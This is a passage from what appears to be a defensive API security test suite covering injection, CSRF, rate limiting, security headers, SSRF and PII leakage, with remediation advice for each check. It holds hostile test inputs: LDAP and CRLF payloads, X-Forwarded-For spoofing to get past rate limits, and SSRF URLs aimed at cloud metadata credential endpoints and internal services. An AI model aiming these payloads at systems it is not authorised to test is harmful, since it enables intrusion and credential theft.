              `Command injection may have executed: "${payload}"`
            );
          }
        }

        if (failures.length === 0) {
          return {
            status: 'pass' as const,
            details: `Tested ${COMMAND_INJECTION_PAYLOADS.length} command injection payloads. No server errors.`,
          };
        }

        return {
          status: 'fail' as const,
          details: `${failures.length} command injection payloads caused server errors`,
          evidence: failures.join('\n'),
          remediation:
            'Never pass user input to shell commands. Use library functions for file operations. Validate filenames against allowlist.',
        };
      },
    });
  }

  /**
   * INJ-005: Test LDAP injection in search fields.
   */
  async testLDAPInjection(): Promise<SecurityTestResult> {
    return this.runTest({
      category: 'Injection',
      testName: 'LDAP Injection',
      description:
        'Verify that LDAP injection payloads in search fields are handled safely',
      severity: 'medium',
      owasp: 'A03:2021 - Injection',
      fn: async () => {
        const ldapPayloads = [
          '*)(uid=*))(|(uid=*',
          '*)(&',
          '*)(|(password=*))',
          'admin)(&)',
          '*()|%26',
        ];

        const failures: string[] = [];

        for (const payload of ldapPayloads) {
          const response = await this.request(
            'GET',
            `/api/v1/team?search=${encodeURIComponent(payload)}`
          );

          if (response.status === 500) {
            failures.push(
              `LDAP injection caused 500: "${payload}"`
            );
          }
        }

        if (failures.length === 0) {
          return {
            status: 'pass' as const,
            details:
              'LDAP injection payloads handled safely (no server errors)',
          };
        }

        return {
          status: 'fail' as const,
          details: `${failures.length} LDAP injection payloads caused server errors`,
          evidence: failures.join('\n'),
          remediation:
            'Escape LDAP special characters in search input. Use parameterized LDAP queries.',
        };
      },
    });
  }

  /**
   * INJ-006: Test CRLF/header injection in custom headers.
   */
  async testHeaderInjection(): Promise<SecurityTestResult> {
    return this.runTest({
      category: 'Injection',
      testName: 'Header Injection (CRLF)',
      description:
        'Verify that CRLF injection in custom headers is prevented',
      severity: 'medium',
      owasp: 'A03:2021 - Injection',
      fn: async () => {
        const crlfPayloads = [
          'value\r\nInjected-Header: evil',
          'value\r\n\r\n<html>injected</html>',
          'value%0d%0aInjected: evil',
          'value\nSet-Cookie: hacked=true',
        ];

        const failures: string[] = [];

        for (const payload of crlfPayloads) {
          try {
            const response = await this.request('GET', '/api/health', {
              headers: { 'X-Custom-Header': payload },
            });

            // Check if injected headers appear in response
            const responseHeaders = JSON.stringify(
              response.headers || {}
            ).toLowerCase();
            if (
              responseHeaders.includes('injected') ||
              responseHeaders.includes('hacked')
            ) {
              failures.push(
                `CRLF injection reflected in headers: "${payload.substring(0, 30)}..."`
              );
            }
          } catch {
            // Some HTTP clients reject CRLF in headers, which is fine
          }
        }

        if (failures.length === 0) {
          return {
            status: 'pass' as const,
            details:
              'CRLF injection payloads in headers are properly handled',
          };
        }

        return {
          status: 'fail' as const,
          details: `${failures.length} CRLF injection payloads reflected in response headers`,
          evidence: failures.join('\n'),
          remediation:
            'Strip CR and LF characters from all header values. Use a web framework that prevents header injection.',
        };
      },
    });
  }

  /**
   * INJ-007: Test path traversal attacks.
   */
  async testPathTraversal(): Promise<SecurityTestResult> {
    return this.runTest({
      category: 'Injection',
      testName: 'Path Traversal',
      description:
        'Verify that path traversal payloads (../) cannot access files outside the web root',
      severity: 'critical',
      owasp: 'A01:2021 - Broken Access Control',
      fn: async () => {
        const failures: string[] = [];

        for (const payload of PATH_TRAVERSAL_PAYLOADS) {
          const response = await this.request(
            'GET',
            `/api/v1/evidence-versions/control/${encodeURIComponent(payload)}`
          );

          const responseBody =
            typeof response.data === 'string'
              ? response.data
              : JSON.stringify(response.data || '');

          // Check for signs of file system access
          if (
            responseBody.includes('root:') ||
            responseBody.includes('[boot loader]') ||
            response.status === 200
          ) {
            failures.push(
              `Path traversal may have succeeded: "${payload}"`
            );
          }
        }

        if (failures.length === 0) {
          return {
            status: 'pass' as const,
            details: `Tested ${PATH_TRAVERSAL_PAYLOADS.length} path traversal payloads. All properly blocked.`,
          };
        }

        return {
          status: 'fail' as const,
          details: `${failures.length} path traversal payloads may have accessed files`,
          evidence: failures.join('\n'),
          remediation:
            'Normalize file paths and verify they resolve within the allowed directory. Use path.resolve() and verify prefix.',
        };
      },
    });
  }

  /**
   * INJ-008: Test NoSQL injection in JSON-based queries.
   */
  async testNoSQLInjection(): Promise<SecurityTestResult> {
    return this.runTest({
      category: 'Injection',
      testName: 'NoSQL Injection',
      description:
        'Verify that NoSQL/JSON-based injection payloads are rejected',
      severity: 'high',
      owasp: 'A03:2021 - Injection',
      fn: async () => {
        const failures: string[] = [];

        for (const payload of NOSQL_INJECTION_PAYLOADS) {
          const response = await this.request(
            'POST',
            '/api/v1/frameworks',
            {
              data: { name: payload, filter: payload },
            }
          );

          if (response.status === 500) {
            failures.push(
              `NoSQL injection caused 500: "${payload}"`
            );
          }

          // Also test in query params
          const queryResponse = await this.request(
            'GET',
            `/api/v1/frameworks?filter=${encodeURIComponent(payload)}`
          );

          if (queryResponse.status === 500) {
            failures.push(
              `NoSQL injection in query caused 500: "${payload}"`
            );
          }
        }

        if (failures.length === 0) {
          return {
            status: 'pass' as const,
            details: `Tested ${NOSQL_INJECTION_PAYLOADS.length} NoSQL injection payloads. No server errors.`,
          };
        }

        return {
          status: 'fail' as const,
          details: `${failures.length} NoSQL injection payloads caused server errors`,
          evidence: failures.join('\n'),
          remediation:
            'Validate input types strictly. Reject objects in string fields. Use schema validation (Joi).',
        };
      },
    });
  }

  // ==========================================================================
  // CSRF TESTS
  // ==========================================================================

  async runCSRFTests(): Promise<SecurityTestResult[]> {
    const results: SecurityTestResult[] = [];

    results.push(await this.testMissingCSRFToken());
    results.push(await this.testInvalidCSRFToken());
    results.push(await this.testCSRFTokenReuse());
    results.push(await this.testCrossSiteRequest());

    return results;
  }

  /**
   * CSRF-001: Test state-changing request without CSRF token.
   */
  async testMissingCSRFToken(): Promise<SecurityTestResult> {
    return this.runTest({
      category: 'CSRF',
      testName: 'Missing CSRF Token',
      description:
        'Verify that state-changing requests without CSRF token are rejected',
      severity: 'medium',
      owasp: 'A01:2021 - Broken Access Control',
      fn: async () => {
        const stateChangingOps = [
          { method: 'POST' as const, path: '/api/v1/frameworks', data: { name: 'CSRF Test' } },
          { method: 'PUT' as const, path: '/api/v1/frameworks/test-id', data: { name: 'CSRF Test' } },
          { method: 'DELETE' as const, path: '/api/v1/frameworks/test-id' },
        ];

        let blockedCount = 0;

        for (const op of stateChangingOps) {
          const response = await this.request(op.method, op.path, {
            data: op.data,
            headers: {
              'Content-Type': 'application/json',
              // Explicitly no CSRF token
            },
          });

          // 401 (no auth) or 403 (CSRF blocked) are both acceptable
          if (
            response.status === 401 ||
            response.status === 403
          ) {
            blockedCount++;
          }
        }

        if (blockedCount === stateChangingOps.length) {
          return {
            status: 'pass' as const,
            details:
              'All state-changing requests are blocked without proper tokens',
          };
        }

        return {
          status: 'warning' as const,
          details: `${blockedCount}/${stateChangingOps.length} state-changing requests blocked without CSRF token. API may rely on JWT Bearer tokens instead of CSRF tokens (acceptable for pure API backends).`,
          remediation:
            'For cookie-based auth, implement CSRF tokens. For Bearer token auth, ensure SameSite cookies and CORS restrictions.',
        };
      },
    });
  }

  /**
   * CSRF-002: Test with invalid CSRF token.
   */
  async testInvalidCSRFToken(): Promise<SecurityTestResult> {
    return this.runTest({
      category: 'CSRF',
      testName: 'Invalid CSRF Token',
      description:
        'Verify that requests with invalid CSRF tokens are rejected',
      severity: 'medium',
      owasp: 'A01:2021 - Broken Access Control',
      fn: async () => {
        const response = await this.request(
          'POST',
          '/api/v1/frameworks',
          {
            data: { name: 'Invalid CSRF Test' },
            headers: {
              'X-CSRF-Token': 'invalid-csrf-token-12345',
              'Content-Type': 'application/json',
            },
          }
        );

        if (response.status === 401 || response.status === 403) {
          return {
            status: 'pass' as const,
            details:
              'Request with invalid CSRF token properly rejected',
          };
        }

        return {
          status: 'warning' as const,
          details: `Request with invalid CSRF token returned ${response.status}. API may use Bearer token auth instead of CSRF.`,
          remediation:
            'If using cookie-based sessions, validate CSRF tokens on all state-changing requests.',
        };
      },
    });
  }

  /**
   * CSRF-003: Test CSRF token reuse.
   */
  async testCSRFTokenReuse(): Promise<SecurityTestResult> {
    return this.runTest({
      category: 'CSRF',
      testName: 'CSRF Token Reuse',
      description:
        'Verify that CSRF tokens cannot be reused across multiple requests',
      severity: 'low',
      owasp: 'A01:2021 - Broken Access Control',
      fn: async () => {
        const csrfToken = 'reused-csrf-token-abc123';

        // Send two requests with the same CSRF token
        const response1 = await this.request(
          'POST',
          '/api/v1/frameworks',
          {
            data: { name: 'CSRF Reuse Test 1' },
            headers: { 'X-CSRF-Token': csrfToken },
          }
        );

        const response2 = await this.request(
          'POST',
          '/api/v1/frameworks',
          {
            data: { name: 'CSRF Reuse Test 2' },
            headers: { 'X-CSRF-Token': csrfToken },
          }
        );

        // Both should be blocked (401 for no auth, 403 for invalid CSRF)
        if (
          (response1.status === 401 || response1.status === 403) &&
          (response2.status === 401 || response2.status === 403)
        ) {
          return {
            status: 'pass' as const,
            details:
              'CSRF token reuse properly handled (both requests blocked)',
          };
        }

        return {
          status: 'info' as const,
          details:
            'CSRF token reuse test inconclusive. API may use stateless Bearer token auth.',
          remediation:
            'For cookie-based auth, implement single-use CSRF tokens.',
        };
      },
    });
  }

  /**
   * CSRF-004: Verify Origin/Referer header validation.
   */
  async testCrossSiteRequest(): Promise<SecurityTestResult> {
    return this.runTest({
      category: 'CSRF',
      testName: 'Cross-Site Request Validation',
      description:
        'Verify that requests from unauthorized origins are rejected via CORS',
      severity: 'medium',
      owasp: 'A01:2021 - Broken Access Control',
      fn: async () => {
        const maliciousOrigins = [
          'https://evil-site.com',
          'https://attacker.example.com',
          'null',
        ];

        const failures: string[] = [];

        for (const origin of maliciousOrigins) {
          const response = await this.request(
            'POST',
            '/api/v1/frameworks',
            {
              data: { name: 'CORS Test' },
              headers: {
                Origin: origin,
                Referer: `${origin}/exploit.html`,
              },
            }
          );

          // Check CORS response headers
          const allowOrigin =
            response.headers?.['access-control-allow-origin'];

          if (allowOrigin === origin || allowOrigin === '*') {
            failures.push(
              `Origin "${origin}" is allowed by CORS: ${allowOrigin}`
            );
          }
        }

        if (failures.length === 0) {
          return {
            status: 'pass' as const,
            details:
              'CORS properly restricts requests from unauthorized origins',
          };
        }

        return {
          status: 'fail' as const,
          details: `${failures.length} malicious origins allowed by CORS`,
          evidence: failures.join('\n'),
          remediation:
            'Configure CORS to only allow specific, trusted origins. Never use wildcard (*) in production.',
        };
      },
    });
  }

  // ==========================================================================
  // RATE LIMITING TESTS
  // ==========================================================================

  async runRateLimitingTests(): Promise<SecurityTestResult[]> {
    const results: SecurityTestResult[] = [];

    results.push(await this.testAPIRateLimit());
    results.push(await this.testAuthRateLimit());
    results.push(await this.testRateLimitBypass());
    results.push(await this.testRateLimitReset());

    return results;
  }

  /**
   * RATE-001: Test general API rate limiting.
   */
  async testAPIRateLimit(): Promise<SecurityTestResult> {
    return this.runTest({
      category: 'Rate Limiting',
      testName: 'API Rate Limit',
      description:
        'Verify that general API rate limiting is enforced to prevent abuse',
      severity: 'medium',
      owasp: 'A04:2021 - Insecure Design',
      fn: async () => {
        const requestCount = 50;
        let rateLimited = false;
        let requestsMade = 0;

        for (let i = 0; i < requestCount; i++) {
          const response = await this.request('GET', '/api/health');
          requestsMade++;

          if (response.status === 429) {
            rateLimited = true;
            break;
          }
        }

        if (rateLimited) {
          return {
            status: 'pass' as const,
            details: `Rate limiting triggered after ${requestsMade} requests`,
          };
        }

        return {
          status: 'warning' as const,
          details: `Sent ${requestsMade} rapid requests without triggering rate limit on /api/health. Rate limiting may have a higher threshold or is not applied to health endpoints.`,
          remediation:
            'Implement rate limiting on all API endpoints. Recommended: 100 requests per minute for general endpoints.',
        };
      },
    });
  }

  /**
   * RATE-002: Test authentication endpoint rate limiting (stricter).
   */
  async testAuthRateLimit(): Promise<SecurityTestResult> {
    return this.runTest({
      category: 'Rate Limiting',
      testName: 'Authentication Rate Limit',
      description:
        'Verify stricter rate limiting on authentication endpoints (5 attempts per 15 minutes)',
      severity: 'high',
      owasp: 'A07:2021 - Identification and Authentication Failures',
      fn: async () => {
        const maxAttempts = 15;
        let rateLimited = false;
        let attemptsMade = 0;

        for (let i = 0; i < maxAttempts; i++) {
          const response = await this.request(
            'POST',
            '/api/v1/auth/login',
            {
              data: {
                email: `rate-limit-test-${i}@example.com`,
                password: 'wrong',
              },
            }
          );

          attemptsMade++;

          if (response.status === 429) {
            rateLimited = true;
            break;
          }
        }

        if (rateLimited) {
          return {
            status: 'pass' as const,
            details: `Auth rate limiting triggered after ${attemptsMade} attempts`,
          };
        }

        return {
          status: 'warning' as const,
          details: `Sent ${attemptsMade} login attempts without triggering auth rate limit`,
          remediation:
            'Implement strict rate limiting on /api/v1/auth/login: 5 attempts per 15 minutes per IP',
        };
      },
    });
  }

  /**
   * RATE-003: Test rate limit bypass via X-Forwarded-For header manipulation.
   */
  async testRateLimitBypass(): Promise<SecurityTestResult> {
    return this.runTest({
      category: 'Rate Limiting',
      testName: 'Rate Limit Bypass via Header Manipulation',
      description:
        'Verify that rate limiting cannot be bypassed by spoofing X-Forwarded-For headers',
      severity: 'high',
      owasp: 'A04:2021 - Insecure Design',
      fn: async () => {
        const requestCount = 20;
        let anyRateLimited = false;
        const spoofedIPs = [
          '10.0.0.1',
          '10.0.0.2',
          '192.168.1.1',
          '172.16.0.1',
        ];

        for (let i = 0; i < requestCount; i++) {
          const response = await this.request(
            'POST',
            '/api/v1/auth/login',
            {
              data: {
                email: `bypass-test-${i}@example.com`,
                password: 'wrong',
              },
              headers: {
                'X-Forwarded-For':
                  spoofedIPs[i % spoofedIPs.length],
              },
            }
          );

          if (response.status === 429) {
            anyRateLimited = true;
            break;
          }
        }

        if (anyRateLimited) {
          return {
            status: 'pass' as const,
            details:
              'Rate limiting is not bypassed by X-Forwarded-For header spoofing',
          };
        }

        return {
          status: 'warning' as const,
          details: `Sent ${requestCount} requests with spoofed X-Forwarded-For headers. Rate limiting may be bypassable or has a high threshold.`,
          remediation:
            'Configure rate limiter to use the real client IP. If behind a reverse proxy, trust only the first hop. Set express "trust proxy" to the proxy count.',
        };
      },
    });
  }

  /**
   * RATE-004: Verify rate limit window resets after the configured period.
   */
  async testRateLimitReset(): Promise<SecurityTestResult> {
    return this.runTest({
      category: 'Rate Limiting',
      testName: 'Rate Limit Reset',
      description:
        'Verify that rate limit headers are present and indicate proper reset behavior',
      severity: 'low',
      owasp: 'A04:2021 - Insecure Design',
      fn: async () => {
        const response = await this.request('GET', '/api/health');

        const rateLimitHeaders = {
          limit:
            response.headers?.['x-ratelimit-limit'] ||
            response.headers?.['ratelimit-limit'],
          remaining:
            response.headers?.['x-ratelimit-remaining'] ||
            response.headers?.['ratelimit-remaining'],
          reset:
            response.headers?.['x-ratelimit-reset'] ||
            response.headers?.['ratelimit-reset'],
        };

        const hasHeaders = Object.values(rateLimitHeaders).some(
          (v) => v !== undefined
        );

        if (hasHeaders) {
          return {
            status: 'pass' as const,
            details: `Rate limit headers present: limit=${rateLimitHeaders.limit}, remaining=${rateLimitHeaders.remaining}, reset=${rateLimitHeaders.reset}`,
          };
        }

        return {
          status: 'info' as const,
          details:
            'No rate limit headers found in response. Rate limiting may be implemented without headers.',
          remediation:
            'Include X-RateLimit-Limit, X-RateLimit-Remaining, and X-RateLimit-Reset headers for client awareness.',
        };
      },
    });
  }

  // ==========================================================================
  // SECURITY HEADERS TESTS
  // ==========================================================================

  async runSecurityHeaderTests(): Promise<SecurityTestResult[]> {
    const results: SecurityTestResult[] = [];

    results.push(await this.testCSPHeader());
    results.push(await this.testHSTSHeader());
    results.push(await this.testXFrameOptions());
    results.push(await this.testXContentType());
    results.push(await this.testReferrerPolicy());
    results.push(await this.testCacheControl());

    return results;
  }

  /**
   * HDR-001: Verify Content-Security-Policy header.
   */
  async testCSPHeader(): Promise<SecurityTestResult> {
    return this.runTest({
      category: 'Security Headers',
      testName: 'Content-Security-Policy',
      description:
        'Verify that Content-Security-Policy header is set to prevent XSS and data injection',
      severity: 'medium',
      owasp: 'A05:2021 - Security Misconfiguration',
      fn: async () => {
        const response = await this.request('GET', '/api/health');
        const csp = response.headers?.['content-security-policy'];

        if (csp) {
          const hasDefaultSrc = csp.includes("default-src");
          const hasScriptSrc = csp.includes("script-src");
          const hasUnsafeInline = csp.includes("'unsafe-inline'");

          if (hasDefaultSrc && !hasUnsafeInline) {
            return {
              status: 'pass' as const,
              details: `CSP header present and properly configured`,
              evidence: `CSP: ${csp.substring(0, 200)}`,
            };
          }

          return {
            status: 'warning' as const,
            details: `CSP header present but may be too permissive`,
            evidence: `CSP: ${csp.substring(0, 200)}`,
            remediation:
              "Remove 'unsafe-inline' and 'unsafe-eval'. Use nonces or hashes for inline scripts.",
          };
        }

        return {
          status: 'warning' as const,
          details: 'Content-Security-Policy header not found',
          remediation:
            "Set CSP header: default-src 'self'; script-src 'self'; style-src 'self'",
        };
      },
    });
  }

  /**
   * HDR-002: Verify Strict-Transport-Security header.
   */
  async testHSTSHeader(): Promise<SecurityTestResult> {
    return this.runTest({
      category: 'Security Headers',
      testName: 'Strict-Transport-Security (HSTS)',
      description:
        'Verify that HSTS header enforces HTTPS with adequate max-age',
      severity: 'medium',
      owasp: 'A05:2021 - Security Misconfiguration',
      fn: async () => {
        const response = await this.request('GET', '/api/health');
        const hsts =
          response.headers?.['strict-transport-security'];

        if (hsts) {
          const maxAgeMatch = hsts.match(/max-age=(\d+)/);
          const maxAge = maxAgeMatch
            ? parseInt(maxAgeMatch[1], 10)
            : 0;

          if (maxAge >= 31536000) {
            return {
              status: 'pass' as const,
              details: `HSTS header present with adequate max-age (${maxAge}s)`,
              evidence: `HSTS: ${hsts}`,
            };
          }

          return {
            status: 'warning' as const,
            details: `HSTS max-age is ${maxAge}s (recommended: 31536000)`,
            evidence: `HSTS: ${hsts}`,
            remediation:
              'Set max-age to at least 31536000 (1 year). Consider adding includeSubDomains.',
          };
        }

        return {
          status: 'info' as const,
          details:
            'HSTS header not found. May not be applicable for local/HTTP environments.',
          remediation:
            'Set Strict-Transport-Security: max-age=31536000; includeSubDomains in production',
        };
      },
    });
  }

  /**
   * HDR-003: Verify X-Frame-Options header.
   */
  async testXFrameOptions(): Promise<SecurityTestResult> {
    return this.runTest({
      category: 'Security Headers',
      testName: 'X-Frame-Options',
      description:
        'Verify that X-Frame-Options is set to DENY to prevent clickjacking',
      severity: 'medium',
      owasp: 'A05:2021 - Security Misconfiguration',
      fn: async () => {
        const response = await this.request('GET', '/api/health');
        const xfo = response.headers?.['x-frame-options'];

        if (xfo) {
          const value = xfo.toUpperCase();
          if (value === 'DENY' || value === 'SAMEORIGIN') {
            return {
              status: 'pass' as const,
              details: `X-Frame-Options set to ${value}`,
            };
          }

          return {
            status: 'warning' as const,
            details: `X-Frame-Options set to ${value} (expected DENY or SAMEORIGIN)`,
            remediation: 'Set X-Frame-Options: DENY',
          };
        }

        return {
          status: 'warning' as const,
          details: 'X-Frame-Options header not found',
          remediation:
            'Set X-Frame-Options: DENY. Also set CSP frame-ancestors directive.',
        };
      },
    });
  }

  /**
   * HDR-004: Verify X-Content-Type-Options header.
   */
  async testXContentType(): Promise<SecurityTestResult> {
    return this.runTest({
      category: 'Security Headers',
      testName: 'X-Content-Type-Options',
      description:
        'Verify that X-Content-Type-Options: nosniff is set to prevent MIME type confusion',
      severity: 'low',
      owasp: 'A05:2021 - Security Misconfiguration',
      fn: async () => {
        const response = await this.request('GET', '/api/health');
        const xcto = response.headers?.['x-content-type-options'];

        if (xcto && xcto.toLowerCase() === 'nosniff') {
          return {
            status: 'pass' as const,
            details: 'X-Content-Type-Options: nosniff is set',
          };
        }

        return {
          status: 'warning' as const,
          details: xcto
            ? `X-Content-Type-Options set to "${xcto}" (expected "nosniff")`
            : 'X-Content-Type-Options header not found',
          remediation: 'Set X-Content-Type-Options: nosniff',
        };
      },
    });
  }

  /**
   * HDR-005: Verify Referrer-Policy header.
   */
  async testReferrerPolicy(): Promise<SecurityTestResult> {
    return this.runTest({
      category: 'Security Headers',
      testName: 'Referrer-Policy',
      description:
        'Verify that Referrer-Policy is set to prevent information leakage',
      severity: 'low',
      owasp: 'A05:2021 - Security Misconfiguration',
      fn: async () => {
        const response = await this.request('GET', '/api/health');
        const rp = response.headers?.['referrer-policy'];

        const securePolicies = [
          'no-referrer',
          'no-referrer-when-downgrade',
          'same-origin',
          'strict-origin',
          'strict-origin-when-cross-origin',
        ];

        if (rp && securePolicies.includes(rp.toLowerCase())) {
          return {
            status: 'pass' as const,
            details: `Referrer-Policy set to: ${rp}`,
          };
        }

        return {
          status: 'warning' as const,
          details: rp
            ? `Referrer-Policy set to "${rp}" (consider stricter policy)`
            : 'Referrer-Policy header not found',
          remediation:
            'Set Referrer-Policy: strict-origin-when-cross-origin or no-referrer',
        };
      },
    });
  }

  /**
   * HDR-006: Verify Cache-Control for sensitive endpoints.
   */
  async testCacheControl(): Promise<SecurityTestResult> {
    return this.runTest({
      category: 'Security Headers',
      testName: 'Cache-Control for Sensitive Endpoints',
      description:
        'Verify that sensitive API endpoints set no-cache/no-store to prevent data leakage via caches',
      severity: 'medium',
      owasp: 'A05:2021 - Security Misconfiguration',
      fn: async () => {
        const sensitiveEndpoints = [
          '/api/v1/frameworks',
          '/api/v1/team',
        ];

        const failures: string[] = [];

        for (const endpoint of sensitiveEndpoints) {
          const response = await this.request('GET', endpoint);
          const cacheControl = response.headers?.['cache-control'];

          if (cacheControl) {
            const hasNoStore = cacheControl.includes('no-store');
            const hasNoCache = cacheControl.includes('no-cache');
            const hasPrivate = cacheControl.includes('private');

            if (!hasNoStore && !hasNoCache && !hasPrivate) {
              failures.push(
                `${endpoint}: Cache-Control="${cacheControl}" (missing no-store/no-cache)`
              );
            }
          }
          // Missing cache-control on auth-protected endpoints is acceptable
          // as the 401 response itself should not be cached
        }

        if (failures.length === 0) {
          return {
            status: 'pass' as const,
            details:
              'Sensitive endpoints have appropriate cache control headers or require authentication',
          };
        }

        return {
          status: 'warning' as const,
          details: `${failures.length} sensitive endpoints may have permissive caching`,
          evidence: failures.join('\n'),
          remediation:
            'Set Cache-Control: no-store, no-cache, must-revalidate for sensitive endpoints',
        };
      },
    });
  }

  // ==========================================================================
  // SSRF TESTS
  // ==========================================================================

  async runSSRFTests(): Promise<SecurityTestResult[]> {
    const results: SecurityTestResult[] = [];

    results.push(await this.testPrivateIPBlocking());
    results.push(await this.testLocalhostBlocking());
    results.push(await this.testMetadataEndpoint());
    results.push(await this.testDNSRebinding());

    return results;
  }

  /**
   * SSRF-001: Test private IP range blocking.
   */
  async testPrivateIPBlocking(): Promise<SecurityTestResult> {
    return this.runTest({
      category: 'SSRF',
      testName: 'Private IP Range Blocking',
      description:
        'Verify that SSRF attempts to private IP ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16) are blocked',
      severity: 'high',
      owasp: 'A10:2021 - Server-Side Request Forgery',
      fn: async () => {
        const privateIPs = [
          'http://10.0.0.1',
          'http://172.16.0.1',
          'http://192.168.1.1',
          'http://10.255.255.255',
          'http://172.31.255.255',
          'http://192.168.255.255',
        ];

        const failures: string[] = [];

        for (const ip of privateIPs) {
          // Try to make the server fetch a private IP via any URL-accepting endpoint
          const response = await this.request(
            'POST',
            '/api/v1/webhooks',
            {
              data: { url: ip, callbackUrl: ip },
            }
          );

          // 200 with data suggesting the request was made is a vulnerability
          if (response.status === 200) {
            const responseBody = JSON.stringify(response.data || '');
            if (
              responseBody.includes('success') ||
              responseBody.includes('connected')
            ) {
              failures.push(
                `Private IP ${ip} may be accessible via SSRF`
              );
            }
          }
        }

        if (failures.length === 0) {
          return {
            status: 'pass' as const,
            details:
              'Private IP ranges are not accessible via server-side requests (or endpoint is properly protected)',
          };
        }

        return {
          status: 'fail' as const,
          details: `${failures.length} private IPs may be accessible via SSRF`,
          evidence: failures.join('\n'),
          remediation:
            'Validate all user-supplied URLs against a blocklist of private IP ranges before making server-side requests',
        };
      },
    });
  }

  /**
   * SSRF-002: Test localhost blocking.
   */
  async testLocalhostBlocking(): Promise<SecurityTestResult> {
    return this.runTest({
      category: 'SSRF',
      testName: 'Localhost Blocking',
      description:
        'Verify that SSRF attempts to localhost variants (127.0.0.1, localhost, 0.0.0.0) are blocked',
      severity: 'high',
      owasp: 'A10:2021 - Server-Side Request Forgery',
      fn: async () => {
        const localhostVariants = [
          'http://127.0.0.1',
          'http://localhost',
          'http://0.0.0.0',
          'http://[::1]',
          'http://127.0.0.1:3001',
          'http://localhost:5432', // PostgreSQL
          'http://localhost:6379', // Redis
        ];

        const failures: string[] = [];

        for (const url of localhostVariants) {
          const response = await this.request(
            'POST',
            '/api/v1/webhooks',
            {
              data: { url, callbackUrl: url },
            }
          );

          if (response.status === 200) {
            const responseBody = JSON.stringify(response.data || '');
            if (
              responseBody.includes('success') ||
              responseBody.includes('connected') ||
              responseBody.includes('alive')
            ) {
              failures.push(
                `Localhost variant ${url} may be accessible`
              );
            }
          }
        }

        if (failures.length === 0) {
          return {
            status: 'pass' as const,
            details:
              'Localhost variants are properly blocked or endpoint is protected',
          };
        }

        return {
          status: 'fail' as const,
          details: `${failures.length} localhost variants may be accessible`,
          evidence: failures.join('\n'),
          remediation:
            'Block all localhost and loopback addresses in URL validation. Include IPv4, IPv6, and hostname variants.',
        };
      },
    });
  }

  /**
   * SSRF-003: Test cloud metadata endpoint access.
   */
  async testMetadataEndpoint(): Promise<SecurityTestResult> {
    return this.runTest({
      category: 'SSRF',
      testName: 'Cloud Metadata Endpoint Access',
      description:
        'Verify that the cloud metadata endpoint (169.254.169.254) is blocked to prevent credential theft',
      severity: 'critical',
      owasp: 'A10:2021 - Server-Side Request Forgery',
      fn: async () => {
        const metadataUrls = [
          'http://169.254.169.254/latest/meta-data/',
          'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
          'http://metadata.google.internal/computeMetadata/v1/',
          'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
        ];

        const failures: string[] = [];

        for (const url of metadataUrls) {
          const response = await this.request(
            'POST',
            '/api/v1/webhooks',
            {
              data: { url, callbackUrl: url },
            }
          );

          if (response.status === 200) {
            const responseBody = JSON.stringify(response.data || '');
            if (
              responseBody.includes('ami-id') ||
              responseBody.includes('instance') ||
              responseBody.includes('credential')
            ) {
              failures.push(
                `Metadata endpoint accessible: ${url}`
              );
            }
          }
        }

        if (failures.length === 0) {
          return {
            status: 'pass' as const,
            details:
              'Cloud metadata endpoints are properly blocked or endpoint is protected',
          };
        }

        return {
          status: 'fail' as const,
          details: `${failures.length} cloud metadata endpoints may be accessible via SSRF`,
          evidence: failures.join('\n'),
          remediation:
            'Block 169.254.169.254 and cloud metadata hostnames. Use IMDSv2 (token-required) on AWS.',
        };
      },
    });
  }

  /**
   * SSRF-004: Test DNS rebinding protection.
   */
  async testDNSRebinding(): Promise<SecurityTestResult> {
    return this.runTest({
      category: 'SSRF',
      testName: 'DNS Rebinding Protection',
      description:
        'Verify that DNS rebinding attacks are mitigated (domain resolving to internal IP)',
      severity: 'medium',
      owasp: 'A10:2021 - Server-Side Request Forgery',
      fn: async () => {
        // Test with URLs that could be used for DNS rebinding
        const rebindingUrls = [
          'http://0x7f000001', // 127.0.0.1 in hex
          'http://2130706433', // 127.0.0.1 in decimal
          'http://017700000001', // 127.0.0.1 in octal
          'http://127.1', // Short form of 127.0.0.1
        ];

        const failures: string[] = [];

        for (const url of rebindingUrls) {
          const response = await this.request(
            'POST',
            '/api/v1/webhooks',
            {
              data: { url },
            }
          );

          if (response.status === 200) {
            const responseBody = JSON.stringify(response.data || '');
            if (
              responseBody.includes('success') ||
              responseBody.includes('connected')
            ) {
              failures.push(
                `DNS rebinding variant accessible: ${url}`
              );
            }
          }
        }

        if (failures.length === 0) {
          return {
            status: 'pass' as const,
            details:
              'DNS rebinding variants are properly handled or endpoint is protected',
          };
        }

        return {
          status: 'fail' as const,
          details: `${failures.length} DNS rebinding variants may be exploitable`,
          evidence: failures.join('\n'),
          remediation:
            'Resolve hostnames to IPs before making requests and validate the resolved IP against blocklists. Use a DNS-over-HTTPS resolver with rebinding protection.',
        };
      },
    });
  }

  // ==========================================================================
  // DATA PROTECTION TESTS
  // ==========================================================================

  async runDataProtectionTests(): Promise<SecurityTestResult[]> {
    const results: SecurityTestResult[] = [];

    results.push(await this.testPIIInLogs());
    results.push(await this.testSensitiveDataExposure());
    results.push(await this.testEncryptionAtRest());
    results.push(await this.testErrorDetailLeakage());

    return results;
  }

  /**
   * DATA-001: Verify PII is not leaked in error responses.
   */
  async testPIIInLogs(): Promise<SecurityTestResult> {
    return this.runTest({
      category: 'Data Protection',
      testName: 'PII Leakage in Error Responses',
      description:
        'Verify that error responses do not contain personally identifiable information (PII)',
      severity: 'high',
      owasp: 'A02:2021 - Cryptographic Failures',
      fn: async () => {
        const piiPatterns = [
          /\b\d{3}-\d{2}-\d{4}\b/, // SSN
          /\b\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}\b/, // Credit card
          /password["\s]*[:=]["\s]*[^\s,}]+/i, // Password in response
          /secret["\s]*[:=]["\s]*[^\s,}]+/i, // Secret in response
          /api[_-]?key["\s]*[:=]["\s]*[^\s,}]+/i, // API key in response
        ];

        // Trigger various error conditions
        const errorEndpoints = [
          '/api/v1/nonexistent-endpoint',
          '/api/v1/frameworks/invalid-uuid',
          '/api/v1/auth/login',
        ];

        const failures: string[] = [];

        for (const endpoint of errorEndpoints) {
          const response = await this.request('GET', endpoint);
          const responseBody =
            typeof response.data === 'string'
              ? response.data
              : JSON.stringify(response.data || '');

          for (const pattern of piiPatterns) {
            if (pattern.test(responseBody)) {
              failures.push(
                `${endpoint}: PII pattern matched - ${pattern.source}`
              );
            }
          }
        }

        if (failures.length === 0) {
          return {
            status: 'pass' as const,
            details:
